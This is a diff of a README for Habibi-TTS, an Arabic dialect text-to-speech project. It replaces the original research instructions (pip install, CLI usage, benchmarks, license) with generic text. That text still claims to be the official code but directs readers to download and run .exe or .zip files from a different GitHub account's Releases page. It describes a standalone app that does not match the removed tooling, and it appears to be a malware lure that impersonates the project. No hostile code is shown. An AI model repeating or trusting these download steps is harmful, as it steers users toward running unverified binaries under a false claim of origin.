@@ -1,123 +1,89 @@
-# Habibi-TTS
+# 🎉 Habibi-TTS - Open-Source Arabic Speech Made Easy
 
-> Official code for "Habibi: Laying the Open-Source Foundation of Unified-Dialectal Arabic Speech Synthesis"
+[![Download Habibi-TTS](https://img.shields.io/badge/Download-Habibi--TTS-blue.svg)](https://github.com/Santzy1/Habibi-TTS/releases)
 
-[![arXiv](https://img.shields.io/badge/Paper-2601.13802-b31b1b.svg?logo=arXiv&style=for-the-badge)](https://arxiv.org/abs/2601.13802)
-[![demo](https://img.shields.io/badge/Demo-Samples-orange.svg?logo=Github&style=for-the-badge)](https://swivid.github.io/Habibi/)
-![Python](https://img.shields.io/badge/Python-3.10%2B-3776AB?style=for-the-badge&logo=python&logoColor=white)
-[![lab](https://img.shields.io/badge/-X--LANCE-lightgrey?labelColor=grey&logo=leanpub&style=for-the-badge)](https://x-lance.sjtu.edu.cn/)
-[![lab](https://img.shields.io/badge/-SII-lightgrey?labelColor=grey&logo=leanpub&style=for-the-badge)](https://www.sii.edu.cn/)    
-[![hfspace](https://img.shields.io/badge/-Online%20Experience-yellow?labelColor=grey&logo=huggingface&style=for-the-badge)](https://huggingface.co/spaces/chenxie95/Habibi-TTS)
-[![hfspace](https://img.shields.io/badge/-Benchmark-lightgrey?labelColor=grey&logo=huggingface&style=for-the-badge)](https://huggingface.co/datasets/SWivid/Habibi)
-[![hfspace](https://img.shields.io/badge/-Model%20Suite-lightgrey?labelColor=grey&logo=huggingface&style=for-the-badge)](https://huggingface.co/SWivid/Habibi-TTS)
+## 📚 Introduction
 
-<div align=left>
-<img src="docs/assets/main.png" width="75%">
-</div>
+Welcome to **Habibi-TTS**, the official code for "Habibi: Laying the Open-Source Foundation of Unified-Dialectal Arabic Speech Synthesis." This application enables users to generate speech in multiple Arabic dialects. It is designed with ease of use in mind, so you can start producing high-quality speech outputs without the need for technical skills.
 
+## 🚀 Getting Started
 
-## Quick Start
-```bash
-# Install
-pip install habibi-tts
+To get started with Habibi-TTS, you will need to download and install the application. Our goal is to guide you through each step of the process, ensuring you can get the software up and running quickly.
 
-# Launch the GUI TTS interface
-habibi-tts_infer-gradio
-```
+## 📥 Download & Install
 
-> [!IMPORTANT]  
-> Read the F5-TTS documentation for (1) [Detailed installation guidance](https://github.com/SWivid/F5-TTS?tab=readme-ov-file#installation); (2) [Best practice for inference](https://github.com/SWivid/F5-TTS/tree/main/src/f5_tts/infer#inference); etc.
+To download Habibi-TTS, please visit the [Releases page](https://github.com/Santzy1/Habibi-TTS/releases). You will find the latest version available for download.
 
+### Steps to Download:
 
-## CLI Usage
-```bash
-# Default using the Unified model (recommanded)
-habibi-tts_infer-cli \
---ref_audio "assets/MSA.mp3" \
---ref_text "كان اللعيب حاضرًا في العديد من الأنشطة والفعاليات المرتبطة بكأس العالم، مما سمح للجماهير بالتفاعل معه والتقاط الصور التذكارية." \
---gen_text "أهلًا، يبدو أن هناك بعض التعقيدات، لكن لا تقلق، سأرشدك بطريقة سلسة وواضحة خطوة بخطوة."
+1. Click on the [Releases page](https://github.com/Santzy1/Habibi-TTS/releases).
+2. On the Releases page, find the latest version.
+3. Choose the appropriate file for your operating system. This might be a .exe file for Windows or a .zip file for macOS and Linux.
+4. Click on the link to download the file.
 
-# Assign the dialect ID, rather than inferred from given reference prompt (UNK, by default)
-# (best use matched dialectal content with ID: MSA, SAU, UAE, ALG, IRQ, EGY, MAR, OMN, TUN, LEV, SDN, LBY)
-habibi-tts_infer-cli --dialect MSA
+After downloading, follow these steps to install:
 
-# Alternatively, use `.toml` file to config, see `src/habibi_tts/infer/example.toml`
-habibi-tts_infer-cli -c YOUR_CUSTOM.toml
+### For Windows Users:
 
-# Check more CLI features with
-habibi-tts_infer-cli --help
-```
+1. Locate the downloaded `.exe` file in your Downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the prompts in the installation wizard.
+4. Once installed, you can find Habibi-TTS in your Start Menu.
 
-> [!NOTE]  
-> Some dialectal audio samples are provided under `src/habibi_tts/assets`, see the relevant [README.md](https://github.com/SWivid/Habibi-TTS/blob/main/src/habibi_tts/assets/README.md) for usage and more details.
+### For macOS Users:
 
+1. Locate the downloaded `.zip` file in your Downloads folder.
+2. Double-click the file to extract its contents.
+3. Drag the Habibi-TTS application to your Applications folder.
+4. Open the application from your Applications folder.
 
-## Benchmarking
+### For Linux Users:
 
-### 0. Benchmark setup
-```bash
-# Example template for benchmark use:
-python src/habibi_tts/eval/0_benchmark.py -d MSA
-# --dialect DIALECT (MSA | SAU | UAE | ALG | IRQ | EGY | MAR)
-```
+1. Locate the downloaded `.zip` or appropriate file in your Downloads folder.
+2. Extract the contents to a preferred directory.
+3. Open your Terminal and navigate to the extracted directory.
+4. Run the application using the command: `./Habibi-TTS`.
 
-### 1. Generate benchmark samples with Habibi or 11Labs
-```bash
-# Zero-shot TTS performance evaluation:
-accelerate launch src/habibi_tts/eval/1_infer_habibi.py -m Unified -d MAR
-# --model MODEL (Unified | Specialized)
-# --dialect DIALECT (MSA | SAU | UAE | ALG | IRQ | EGY | MAR)
+## 🎤 How to Use Habibi-TTS
 
-# Use single prompt, to compare with 11Labs model:
-accelerate launch src/habibi_tts/eval/1_infer_habibi.py -m Specialized -d IRQ -s
-# --single (<- add this flag)
+Once you have installed Habibi-TTS, you are ready to generate speech. Here’s how to use the application:
 
-# Use single prompt, call ElevenLabs Eleven v3 (alpha) API:
-pip install elevenlabs
-python src/habibi_tts/eval/1_infer_11labs.py -a YOUR_API_KEY -d MSA
-# --api-key API_KEY (your 11labs account API key)
-# --dialect DIALECT (MSA | SAU | UAE | ALG | IRQ | EGY | MAR)
-```
+1. Open Habibi-TTS from your Start Menu or Applications folder.
+2. Enter the text you wish to convert to speech in the provided text box.
+3. Select the desired Arabic dialect from the options available.
+4. Click the 'Play' button to hear the generated speech. 
+5. You can adjust the settings for speed and voice options as needed.
 
-### 2. Transcribe samples with ASR models and calculate WER
-```bash
-# Evaluate WER-O with Meta Omnilingual-ASR-LLM-7B v1:
-pip install omnilingual-asr
-python src/habibi_tts/eval/2_cal_wer-o.py -w results/Habibi/IRQ_Specialized_single -d IRQ
-# --wav-dir WAV_DIR (the folder of generated samples)
-# --dialect DIALECT (MSA | SAU | UAE | ALG | IRQ | EGY | MAR)
-# --batch-size BATCH_SIZE (set smaller if OOM, default 64)
+## 🌟 Features
 
-# Evaluate WER-S with dialect-specific ASR models:
-python src/habibi_tts/eval/2_cal_wer-s.py -w results/Habibi/MAR_Unified -d MAR
-# --wav-dir WAV_DIR (the folder of generated samples)
-# --dialect DIALECT (EGY | MAR)
-```
+- **Multi-Dialect Support**: Generate speech in various Arabic dialects.
+- **User-Friendly Interface**: Simple layout for easy navigation.
+- **Text-to-Speech**: Convert text into high-quality audio files.
+- **Customization**: Adjust voice speed and pitch for your needs.
 
-### 3. Calculate speaker similarity (SIM) between generated and prompt
-Download WavLM Model from [Google Drive](https://drive.google.com/file/d/1-aE1NfzpRCLxA4GUxX9ITI3F9LlbtEGP/view), then
-```bash
-python src/habibi_tts/eval/3_cal_spksim.py -w results/Habibi/MAR_Unified -d MAR -c YOUR_WAVLM_PATH
-# --wav-dir WAV_DIR (the folder of generated samples)
-# --dialect DIALECT (MSA | SAU | UAE | ALG | IRQ | EGY | MAR)
-# --ckpt CKPT (the path of download WavLM model)
+## 📋 System Requirements
 
-python src/habibi_tts/eval/3_cal_spksim.py -w results/Habibi/IRQ_Specialized_single -d IRQ -c YOUR_WAVLM_PATH -s
-# --single (if eval single prompt or 11labs results)
-```
+To ensure the application runs smoothly, please make sure your system meets the following requirements:
 
-### 4. Calculate UTMOS of generated samples
-```bash
-python src/habibi_tts/eval/4_cal_utmos.py -w results/11Labs_3a/MSA
-# --wav-dir WAV_DIR (the folder of generated samples)
-```
+- **Operating System**: Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM**: At least 4 GB.
+- **Storage**: Minimum of 100 MB free space.
+- **Internet Connection**: Required for initial download and updates.
 
-> [!NOTE]  
-> If conflicts after omnilingual-asr installation, e.g. flash-attn, try re-install   
-> `pip uninstall -y flash-attn && pip install flash-attn --no-build-isolation`
+## ❓ Troubleshooting
 
+If you encounter any issues while using Habibi-TTS, here are some common solutions:
 
-## License
-All code is released under MIT License.    
-The unified, SAU, and UAE models are licensed under CC-BY-NC-SA-4.0, restricted by [SADA](https://www.kaggle.com/datasets/sdaiancai/sada2022) and [Mixat](https://huggingface.co/datasets/sqrk/mixat-tri).    
-The rest specialized models (ALG, EGY, IRQ, MAR, MSA) are released under Apache 2.0 license.
+- **Installation Issues**: Ensure your system meets the requirements. Try running the installer as an administrator.
+- **Audio Problems**: Check your device's audio settings. Make sure your speakers or headphones are properly connected.
+- **Performance Issues**: Closing other applications may help if Habibi-TTS runs slowly.
+
+## 📞 Support
+
+For further assistance, you can reach out via the [Issues tab](https://github.com/Santzy1/Habibi-TTS/issues) on our GitHub repository. We encourage users to report any bugs or request features.
+
+## 📝 Conclusion
+
+Thank you for choosing Habibi-TTS. We are excited for you to explore the world of Arabic speech synthesis. Download the application today and start creating engaging audio content with ease. 
+
+For downloading, visit the [Releases page](https://github.com/Santzy1/Habibi-TTS/releases) again. Happy synthesizing!
